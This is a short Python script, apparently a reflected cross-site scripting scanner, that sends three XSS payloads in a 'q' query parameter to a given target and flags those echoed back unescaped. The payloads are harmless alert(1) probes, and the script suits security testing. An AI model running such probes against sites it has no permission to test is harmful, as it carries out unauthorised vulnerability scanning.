import requests

payloads = [
    "<script>alert(1)</script>",
    "\"'><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>"
]

def xss_test(target):
    results = []
    for p in payloads:
        try:
            url = f"{target}?q={p}"
            r = requests.get(url, timeout=5)
            if p in r.text:
                results.append({"payload": p, "vulnerable": True})
        except:
            pass
    return {"results": results or "No XSS detected"}
